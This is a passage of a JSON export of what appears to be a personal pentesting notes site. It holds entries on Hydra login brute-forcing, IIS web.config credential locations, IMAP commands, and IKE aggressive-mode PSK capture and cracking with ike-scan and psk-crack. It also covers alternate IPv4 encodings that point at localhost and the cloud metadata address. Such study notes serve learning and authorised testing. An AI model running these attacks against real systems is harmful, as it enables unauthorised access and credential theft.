-vV&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -l&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $USERNAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -P&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $PASSWORDLIST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;      $HOST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; http-post-form&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;      $ENDPOINT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$TEMPLATE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;:F=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$INVALID&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;:H=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Content-Type\\: application/json&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;The &lt;code&gt;$TEMPLATE&lt;/code&gt; is basically the JSON request body with the special placeholders &lt;code&gt;^USER^&lt;/code&gt; and &lt;code&gt;^PASS^&lt;/code&gt; (colons escaped). &lt;code&gt;$INVALID&lt;/code&gt; is a string that will appear for login &lt;em&gt;failures&lt;/em&gt; (note that this string &lt;em&gt;cannot&lt;/em&gt; contain a colon, but fortunately is a substring match). The &lt;code&gt;H&lt;/code&gt; parameter at the end allows us to override specific headers (necessary because otherwise Hydra sends &lt;code&gt;Content-Type: application/x-www-form-urlencoded&lt;/code&gt;).&lt;/p&gt;"},"spells/ICMP":{"slug":"spells/ICMP","filePath":"spells/ICMP.md","title":"ICMP","links":[],"tags":["Protocol/ICMP"],"content":"ICMP is defined by RFC 792. Headers are 8 bytes; the first 4 bytes have a fixed meaning, while the meaning of the last 4 bytes varies depending on the type of request specified in the first 4 bytes.\nICMP traffic “types” correspond to the kind of packet being sent (though different ICMP services can have multiple types):\n\n0 — Ping reply\n8 — Ping request\n\nPing packets typically just include either random data or all zeros.","richContent":"&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;ICMP&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; is defined by &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc792&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;RFC 792&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;. Headers are 8 bytes; the first 4 bytes have a fixed meaning, while the meaning of the last 4 bytes varies depending on the type of request specified in the first 4 bytes.&lt;/p&gt;\n&lt;p&gt;ICMP traffic “types” correspond to the kind of packet being sent (though different ICMP services can have multiple types):&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;0 — Ping reply&lt;/li&gt;\n&lt;li&gt;8 — Ping request&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Ping packets typically just include either random data or all zeros.&lt;/p&gt;"},"spells/IIS-configuration-data":{"slug":"spells/IIS-configuration-data","filePath":"spells/IIS configuration data.md","title":"IIS configuration data","links":[],"tags":["OS/Windows/IIS","AttackCycle/Reconnaissance"],"content":"Placed where IIS stores passwords:\n\nC:\\inetpub\\wwwroot\\web.config\nC:\\Windows\\Microsoft.NET\\Framework64\\$SOME_VERSION_STRING\\Config\\web.config\n\nLook for the connectionString directive.","richContent":"&lt;p&gt;Placed where IIS stores passwords:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;C:\\inetpub\\wwwroot\\web.config&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;C:\\Windows\\Microsoft.NET\\Framework64\\$SOME_VERSION_STRING\\Config\\web.config&lt;/code&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Look for the &lt;code&gt;connectionString&lt;/code&gt; directive.&lt;/p&gt;"},"spells/IMAP":{"slug":"spells/IMAP","filePath":"spells/IMAP.md","title":"IMAP","links":["spells/POP3"],"tags":["Protocol/IMAP"],"content":"Internet Message Access Protocol (IMAP) commands are much more complicated than POP3. Some examples:\n\nLogin User — prefix LOGIN user pass\nLost Folders — prefix LIST &quot;&quot; &quot;\\*&quot;\nList Emails in INBOX — prefix EXAMINE INBOX\nClose Connection — prefix LOGOUT\n\nHere prefix is a random prefix we provide to track server replies to various commands. IMAP accepts a lot of different user authentication methods; LOGIN is just the simplest (and least secure).","richContent":"&lt;p&gt;Internet Message Access Protocol (IMAP) commands are much more complicated than &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/POP3&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/POP3&quot;&gt;POP3&lt;/a&gt;. Some examples:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Login User — &lt;code&gt;prefix LOGIN user pass&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;Lost Folders — &lt;code&gt;prefix LIST &quot;&quot; &quot;\\*&quot;&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;List Emails in INBOX — &lt;code&gt;prefix EXAMINE INBOX&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;Close Connection — &lt;code&gt;prefix LOGOUT&lt;/code&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Here &lt;code&gt;prefix&lt;/code&gt; is a random prefix we provide to track server replies to various commands. IMAP accepts a lot of different user authentication methods; LOGIN is just the simplest (and least secure).&lt;/p&gt;"},"spells/IPSec":{"slug":"spells/IPSec","filePath":"spells/IPSec.md","title":"IPSec","links":[],"tags":["Protocol/IPSec","Application/ike-scan","Application/psk-crack","AttackCycle/Exploitation"],"content":"\n\n                  \n                  Note\n                  \n                \n\n\nAdapted from slyth11907 / Cheatsheets / Cheatsheet_IKEScan.txt.\n\n\n\nIn IKE aggressive mode the authentication hash based on a preshared key (PSK) is transmitted as response to the initial packet of a VPN client that wants to establish an IPSec Tunnel (Hash_R). This hash is not encrypted (in main mode the hash is encrypted).\nThe ike-scan tool can be used to test if an IPSec VPN server is using IKE in aggressive mode:\nsudo ike-scan -A $IP_ADDRESS\nIf aggressive mode is in use, then ike-scan can be used to save the initial exchange for offline cracking:\nsudo ike-scan -A $IP_ADDRESS --id=$ID -P$KEY_FILE\npsk-crack can then be used to (attempt) to crack the resulting $KEY_FILE.\n# Attempt to brute-force all keys up to $KEY_LENGTH using\n# characters from $CHARSET (by default $CHARSET is numbers and\n# lowercase ASCII characters).\n#\npsk-crack --charset=&quot;$CHARSET&quot; -b $KEY_LENGTH $KEY_FILE\n \n# Attempt to crack the PSK using a dictionary.\n#\npsk-crack -d $WORDLIST_FILE $KEY_FILE","richContent":"&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;Adapted from &lt;a href=&quot;https://github.com/slyth11907/Cheatsheets/blob/master/Cheatsheet_IKEScan.txt&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;slyth11907 / Cheatsheets / Cheatsheet_IKEScan.txt&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;In IKE aggressive mode the authentication hash based on a preshared key (PSK) is transmitted as response to the initial packet of a VPN client that wants to establish an IPSec Tunnel (&lt;code&gt;Hash_R&lt;/code&gt;). This hash is not encrypted (in main mode the hash &lt;em&gt;is&lt;/em&gt; encrypted).&lt;/p&gt;\n&lt;p&gt;The ike-scan tool can be used to test if an IPSec VPN server is using IKE in aggressive mode:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; ike-scan&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -A&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $IP_ADDRESS&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;If aggressive mode is in use, then ike-scan can be used to save the initial exchange for offline cracking:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; ike-scan&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -A&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $IP_ADDRESS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --id=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$ID&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -P&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$KEY_FILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;psk-crack can then be used to (attempt) to crack the resulting &lt;code&gt;$KEY_FILE&lt;/code&gt;.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Attempt to brute-force all keys up to $KEY_LENGTH using&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# characters from $CHARSET (by default $CHARSET is numbers and&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# lowercase ASCII characters).&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;psk-crack&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --charset=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$CHARSET&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -b&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $KEY_LENGTH&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $KEY_FILE&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Attempt to crack the PSK using a dictionary.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;psk-crack&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -d&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $WORDLIST_FILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $KEY_FILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/IPv4":{"slug":"spells/IPv4","filePath":"spells/IPv4.md","title":"IPv4","links":[],"tags":["Protocol/IPv4","Cloud/AWS"],"content":"Different IPv4 address representations\nLocalhost can be represented in a lot of different ways.\n\nlocalhost\n127.0.0.1 (IPv4 address)\n[::] or :: (IPv6 address)\n2130706433 (IPv4 in decimal)\n017700000001 (IPv4 in octal)\n0x7f000001 (IPv4 in hexadecimal)\n\nThe last three of these are particularly interesting — IPv4 addresses can be represented as plain numbers!\n\n\n                  \n                  Tip\n                  \n                \n\n\nMany parsing libraries will also accept mixed formats, such as 0x7f.1 (first octet in hexadecimal, remaining octets as decimal), though this behavior is less standardized.\n\n\n\nDecimal/Hexadecimal conversion for IPv4 addresses is relatively simple if you remember that we break IPv4 addresses up into 4 octets, where each octet is 8 binary digits. Thus\n\\begin{aligned}\n127.0.0.1 &amp; = (127 \\times 2^{24}) + (0 \\times 2^{16}) + (0 \\times 2^8) + (1 \\times 2^0) \\\\\n          &amp; = 2130706432 + 0 + 0 + 1 \\\\\n          &amp; = 2130706433\n\\end{aligned}\nConverting to hexadecimal is trivial using the excellent Qalculate! tool.\n2130706433 to hex = 0x7F000001\nCommon addresses\nlocalhost\nlocalhost → 127.0.0.1 → 0x7f000001 → 2130706433\n\nServer metadata\n169.254.169.254 is often used in to reference configuration data in cloud systems (just AWS?).\n169.254.169.254 → 0xa9fea9fe → 2852039166\n","richContent":"&lt;h2 id=&quot;different-ipv4-address-representations&quot;&gt;Different IPv4 address representations&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#different-ipv4-address-representations&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Localhost can be represented in a lot of different ways.&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;localhost&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;127.0.0.1&lt;/code&gt; (IPv4 address)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;[::]&lt;/code&gt; or &lt;code&gt;::&lt;/code&gt; (IPv6 address)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;2130706433&lt;/code&gt; (IPv4 in decimal)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;017700000001&lt;/code&gt; (IPv4 in octal)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;0x7f000001&lt;/code&gt; (IPv4 in hexadecimal)&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;The last three of these are particularly interesting — IPv4 addresses can be represented as plain numbers!&lt;/p&gt;\n&lt;blockquote class=&quot;callout tip&quot; data-callout=&quot;tip&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Tip&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;&lt;em&gt;Many&lt;/em&gt; parsing libraries will also accept mixed formats, such as &lt;code&gt;0x7f.1&lt;/code&gt; (first octet in &lt;em&gt;hexadecimal&lt;/em&gt;, remaining octets as &lt;em&gt;decimal&lt;/em&gt;), though this behavior is less standardized.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;Decimal/Hexadecimal conversion for IPv4 addresses is relatively simple if you remember that we break IPv4 addresses up into 4 &lt;em&gt;octets&lt;/em&gt;, where each octet is 8 binary digits. Thus&lt;/p&gt;\n&lt;mjx-container class=&quot;MathJax&quot; jax=&quot;SVG&quot; display=&quot;true&quot;&gt;&lt;svg style=&quot;vertical-align: -3.667ex;&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;54.955ex&quot; height=&quot;8.465ex&quot; role=&quot;img&quot; focusable=&quot;false&quot; viewBox=&quot;0 -2120.9 24290 3741.7&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;&gt;&lt;defs&gt;&lt;path id=&quot;MJX-1-TEX-N-31&quot; d=&quot;M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z&quot;&gt;&lt;/path&gt;&lt;path id=&quot;MJX-1-TEX-N-32&quot; d=&quot;M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z&quot;&gt;&lt;/path&gt;&lt;path id=&quot;MJX-1-TEX-N-37&quot; d=&quot;M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z&quot;&gt;&lt;/path&gt;&lt;path id=&quot;MJX-1-TEX-N-2E&quot; d=&quot;M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z&quot;&gt;&lt;/path&gt;&lt;path id=&quot;MJX-1-TEX-N-30&quot; d=&quot;M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z&quot;&gt;&lt;/path&gt;&lt;path id=&quot;MJX-1-TEX-N-3D&quot; d=&quot;M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z&quot;&gt;&lt;/path&gt;&lt;path id=&quot;MJX-1-TEX-N-28&quot; d=&quot;M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z&quot;&gt;&lt;/path&gt;&lt;path id=&quot;MJX-1-TEX-N-D7&quot; d=&quot;M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z&quot;&gt;&lt;/path&gt;&lt;path id=&quot;MJX-1-TEX-N-34&quot; d=&quot;M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z&quot;&gt;&lt;/path&gt;&lt;path id=&quot;MJX-1-TEX-N-29&quot; d=&quot;M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z&quot;&gt;&lt;/path&gt;&lt;path id=&quot;MJX-1-TEX-N-2B&quot; d=&quot;M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z&quot;&gt;&lt;/path&gt;&lt;path id=&quot;MJX-1-TEX-N-36&quot; d=&quot;M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z&quot;&gt;&lt;/path&gt;&lt;path id=&quot;MJX-1-TEX-N-38&quot; d=&quot;M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z&quot;&gt;&lt;/path&gt;&lt;path id=&quot;MJX-1-TEX-N-33&quot; d=&quot;M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z&quot;&gt;&lt;/path&gt;&lt;/defs&gt;&lt;g stroke=&quot;currentColor&quot; fill=&quot;currentColor&quot; stroke-width=&quot;0&quot; transform=&quot;scale(1,-1)&quot;&gt;&lt;g data-mml-node=&quot;math&quot;&gt;&lt;g data-mml-node=&quot;mtable&quot;&gt;&lt;g data-mml-node=&quot;mtr&quot; transform=&quot;translate(0,1229.1)&quot;&gt;&lt;g data-mml-node=&quot;mtd&quot;&gt;&lt;g data-mml-node=&quot;mn&quot;&gt;&lt;use data-c=&quot;31&quot; xlink:href=&quot;#MJX-1-TEX-N-31&quot;&gt;&lt;/use&gt;&lt;use data-c=&quot;32&quot; xlink:href=&quot;#MJX-1-TEX-N-32&quot; transform=&quot;translate(500,0)&quot;&gt;&lt;/use&gt;&lt;use data-c=&quot;37&quot; xlink:href=&quot;#MJX-1-TEX-N-37&quot; transform=&quot;translate(1000,0)&quot;&gt;&lt;/use&gt;&lt;use data-c=&quot;2E&quot; xlink:href=&quot;#MJX-1-TEX-N-2E&quot; transform=&quot;translate(1500,0)&quot;&gt;&lt;/use&gt;&lt;use data-c=&quot;30&quot; xlink:href=&quot;#MJX-1-TEX-N-30&quot; 